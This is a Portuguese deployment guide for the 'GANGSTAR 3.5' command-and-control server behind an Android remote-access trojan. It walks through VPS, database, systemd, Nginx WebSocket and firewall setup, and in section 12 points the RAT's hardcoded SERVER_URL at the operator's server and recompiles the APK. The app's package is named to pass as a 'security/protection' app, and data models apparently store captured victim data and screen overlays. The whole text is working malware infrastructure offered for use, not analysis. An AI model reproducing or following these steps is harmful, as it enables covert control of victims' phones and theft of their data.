# Deploy GANGSTAR 3.5 C2 no Ubuntu VPS

## 1. Preparar VPS (Ubuntu 22.04/24.04)

```bash
# Atualizar sistema
apt update && apt upgrade -y

# Instalar dependências base
apt install -y python3 python3-pip python3-venv postgresql postgresql-contrib nginx git curl ufw

# Criar usuário de serviço (sem login)
adduser --system --group --home /opt/gangstar --shell /bin/bash gangstar
```

## 2. Configurar PostgreSQL

```bash
# Entrar no PostgreSQL
sudo -u postgres psql <<'SQL'
CREATE DATABASE rat_db;
CREATE USER postgres WITH PASSWORD '1111';
ALTER ROLE postgres SET client_encoding TO 'utf8';
ALTER ROLE postgres SET default_transaction_isolation TO 'read committed';
ALTER ROLE postgres SET timezone TO 'America/Sao_Paulo';
GRANT ALL PRIVILEGES ON DATABASE rat_db TO postgres;
SQL

# Ajustar autenticação local (md5 em vez de peer)
PG_VERSION=$(ls /etc/postgresql/)
sed -i "s/local   all             all                                     peer/local   all             all                                     md5/" /etc/postgresql/$PG_VERSION/main/pg_hba.conf
systemctl restart postgresql
```

## 3. Transferir Projeto (escolha uma opção)

### Opção A: Git (recomendado)
```bash
cd /opt/gangstar
git clone https://github.com/SEU_USUARIO/SEU_REPO.git .
chown -R gangstar:gangstar /opt/gangstar
```

### Opção B: SCP do Windows (PowerShell)
```powershell
# No Windows (PowerShell como Admin)
cd "C:\Users\menor\OneDrive\Desktop\GANGSTAR 3.5 ORIGINAL\finalvnc\finalvnc"

# Compactar excluindo lixo
tar --exclude='**/build' --exclude='**/.gradle' --exclude='**/venv' --exclude='**/__pycache__' --exclude='**/.git' --exclude='**/*.apk' --exclude='**/node_modules' -czf gangstar.tar.gz .

# Enviar
scp gangstar.tar.gz root@SEU_IP_VPS:/opt/gangstar/
```

```bash
# Na VPS
cd /opt/gangstar
tar -xzf gangstar.tar.gz
chown -R gangstar:gangstar /opt/gangstar
rm gangstar.tar.gz
```

### Opção C: WinSCP / FileZilla (GUI)
1. Instale **WinSCP** no Windows
2. Protocolo: **SFTP**, Host: IP da VPS, User: `root`, Senha/Chave
3. Arraste pasta `finalvnc` → `/opt/gangstar/`
4. Na VPS: `chown -R gangstar:gangstar /opt/gangstar`

---

## 4. Configurar Python + Dependências

```bash
cd /opt/gangstar/server

# Criar venv como usuário gangstar
sudo -u gangstar python3 -m venv venv

# Atualizar pip e instalar requirements
sudo -u gangstar ./venv/bin/pip install --upgrade pip
sudo -u gangstar ./venv/bin/pip install -r requirements.txt
```

## 5. Variáveis de Ambiente

```bash
# Gerar SECRET_KEY forte (execute no terminal local ou na VPS)
openssl rand -base64 32
# Exemplo saída: K7x9mP2qR5vY8wZ1A3bC4dE6fG7hI8jK9lM0nO1pQ2rS3tU4vW5xY6zA7bC8dE9fG0h

cat > /opt/gangstar/server/.env.vps <<'EOF'
SERVER_URL=http://SEU_IP_VPS:7771
SERVER_WS_URL=ws://SEU_IP_VPS:7771/ws
DATABASE_URL=postgresql://postgres:1111@localhost:5432/rat_db
SECRET_KEY=COLE_AQUI_O_SEU_OPENSSL_RAND_BASE64_32
ALGORITHM=HS256
ACCESS_TOKEN_EXPIRE_MINUTES=1440
HYDRA_PROFILE=vps
EOF

chown gangstar:gangstar /opt/gangstar/server/.env.vps
chmod 600 /opt/gangstar/server/.env.vps
```

> **Substitua `SEU_IP_VPS`** pelo IP público da sua VPS (ex: `151.243.137.239`).

## 6. Inicializar Banco de Dados (criar tabelas)

```bash
cd /opt/gangstar/server
sudo -u gangstar ./venv/bin/python -c "
from database import engine, Base
from models import Device, Operator, DeviceLog, APKBuild, APKStudioProject, StudioCapturedData, StudioDataField, UserLayoutPreferences, DeviceOverlayMapping
Base.metadata.create_all(bind=engine)
print('✅ Tabelas criadas com sucesso!')
"
```

## 7. Criar Serviço systemd

```bash
cat > /etc/systemd/system/gangstar.service <<'EOF'
[Unit]
Description=GANGSTAR C2 Server
After=network.target postgresql.service
Requires=postgresql.service

[Service]
Type=simple
User=gangstar
Group=gangstar
WorkingDirectory=/opt/gangstar/server
Environment=PYTHONPATH=/opt/gangstar/server
ExecStart=/opt/gangstar/venv/bin/uvicorn main:app --host 0.0.0.0 --port 7771 --workers 1 --log-level warning
Restart=always
RestartSec=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable gangstar
systemctl start gangstar
```

## 8. Verificar Serviço

```bash
# Status
systemctl status gangstar

# Logs em tempo real
journalctl -u gangstar -f

# Testar API local
curl http://localhost:7771/api/devices
# Deve retornar: {"devices":[]} ou lista de dispositivos
```

## 9. Nginx Reverse Proxy (Porta 80/443)

```bash
cat > /etc/nginx/sites-available/gangstar <<'EOF'
server {
    listen 80;
    server_name SEU_DOMINIO_OU_IP;

    # WebSocket upgrade para /ws
    location /ws {
        proxy_pass http://127.0.0.1:7771;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_read_timeout 86400;
        proxy_send_timeout 86400;
    }

    # API REST + Painel Web
    location / {
        proxy_pass http://127.0.0.1:7771;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_read_timeout 300;
        proxy_send_timeout 300;
    }

    # Limite de upload (apk, logs, etc)
    client_max_body_size 100M;
}
EOF

# Ativar site
ln -sf /etc/nginx/sites-available/gangstar /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

# Testar e reiniciar
nginx -t && systemctl restart nginx
```

## 10. SSL com Let's Encrypt (Opcional, Recomendado)

```bash
# Instalar certbot
apt install -y certbot python3-certbot-nginx

# Gerar certificado (substitua pelo seu domínio)
certbot --nginx -d seu-dominio.com -d www.seu-dominio.com

# Atualizar .env.vps para HTTPS/WSS
sed -i 's|SERVER_URL=http://|SERVER_URL=https://|' /opt/gangstar/server/.env.vps
sed -i 's|SERVER_WS_URL=ws://|SERVER_WS_URL=wss://|' /opt/gangstar/server/.env.vps

# Reiniciar serviço
systemctl restart gangstar
```

## 11. Firewall (UFW)

```bash
# Permitir SSH, HTTP, HTTPS, porta direta (opcional)
ufw allow OpenSSH
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 7771/tcp  # Opcional: acesso direto à API (útil para debug)
ufw enable

# Verificar
ufw status verbose
```

## 12. Atualizar Android RAT (apontar para VPS)

### No arquivo `android-rat/app/src/main/java/com/seguranca/protecao/CommandControlService.java`:

```java
// Linha ~58 - ALTERAR PARA SEU IP/DOMÍNIO
public static final String SERVER_URL = "ws://SEU_IP_VPS:7771/ws";
// Ou com SSL:
public static final String SERVER_URL = "wss://seu-dominio.com/ws";
```

### Recompilar APK na VPS (ou no PC e transferir):

```bash
cd /opt/gangstar/android-rat
HYDRA_SKIP_PARANOID=1 ./gradlew assembleRelease

# APK gerado em:
# app/build/outputs/apk/release/app-release.apk
```

## 13. Acessar Painel

| Serviço | URL |
|---|---|
| **Painel Web** | `http://SEU_IP_VPS:7771` (ou `https://seu-dominio.com`) |
| **WebSocket C&C** | `ws://SEU_IP_VPS:7771/ws` (ou `wss://seu-dominio.com/ws`) |
| **API Docs (Swagger)** | `http://SEU_IP_VPS:7771/docs` |

## 14. Criar Primeiro Operador (Admin)

```bash
cd /opt/gangstar/server
sudo -u gangstar ./venv/bin/python -c "
from database import SessionLocal
from models import Operator
from auth import get_password_hash
db = SessionLocal()
admin = Operator(username='admin', email='admin@local', password_hash=get_password_hash('SUA_SENHA_FORTE'), is_admin=True)
db.add(admin)
db.commit()
print('✅ Admin criado: admin / SUA_SENHA_FORTE')
"
```

## 15. Comandos Úteis Pós-Deploy

```bash
# Reiniciar tudo
systemctl restart gangstar nginx postgresql

# Ver logs
journalctl -u gangstar -f --since "10 minutes ago"

# Backup banco
pg_dump -U postgres rat_db > backup_$(date +%F).sql

# Restaurar backup
psql -U postgres rat_db < backup_2026-10-13.sql

# Atualizar código (se usar git)
cd /opt/gangstar && git pull && systemctl restart gangstar

# Ver portas abertas
ss -tlnp | grep -E '7771|80|443|5432'
```

## 16. Troubleshooting

| Problema | Solução |
|---|---|
| `connection refused` na porta 7771 | `systemctl status gangstar` → veja logs com `journalctl -u gangstar -n 50` |
| WebSocket não conecta | Verifique Nginx: `proxy_set_header Upgrade $http_upgrade;` no bloco `/ws` |
| Erro 502 Bad Gateway | Nginx não alcança 127.0.0.1:7771 → `systemctl restart gangstar` |
| Erro SSL no Android | Use `wss://` + certificado válido (Let's Encrypt). Self-signed não funciona no Android 7+ sem config extra |
| PostgreSQL auth failed | Verifique `pg_hba.conf` → `md5` para local connections |
| APK não conecta | Verifique `SERVER_URL` no `CommandControlService.java` + recompile |

## 17. Estrutura Final na VPS

```
/opt/gangstar/
├── android-rat/          # Projeto Android (gradle)
├── server/
│   ├── main.py           # FastAPI app
│   ├── requirements.txt
│   ├── venv/             # Virtualenv Python
│   ├── .env.vps          # Variáveis de produção
│   ├── database.py
│   ├── models.py
│   ├── auth.py
│   └── ...               # Demais módulos
├── gangstar.service      # systemd unit (em /etc/systemd/system/)
└── nginx config          # Em /etc/nginx/sites-available/gangstar
```

---

## Checklist Final

- [ ] VPS Ubuntu rodando
- [ ] PostgreSQL configurado + banco `rat_db`
- [ ] Projeto transferido para `/opt/gangstar`
- [ ] `venv` criado + `pip install -r requirements.txt`
- [ ] `.env.vps` com `SERVER_URL`, `SERVER_WS_URL`, `SECRET_KEY`
- [ ] Tabelas criadas (`Base.metadata.create_all`)
- [ ] `systemctl enable --now gangstar`
- [ ] Nginx configurado + testado (`nginx -t`)
- [ ] SSL configurado (Let's Encrypt) → URLs HTTPS/WSS
- [ ] Firewall liberado (80, 443, 7771, 22)
- [ ] Android RAT recompilado com `SERVER_URL` da VPS
- [ ] Admin criado no painel
- [ ] Dispositivo conecta e aparece no painel

---

**Pronto!** Seu C2 está no ar. 🚀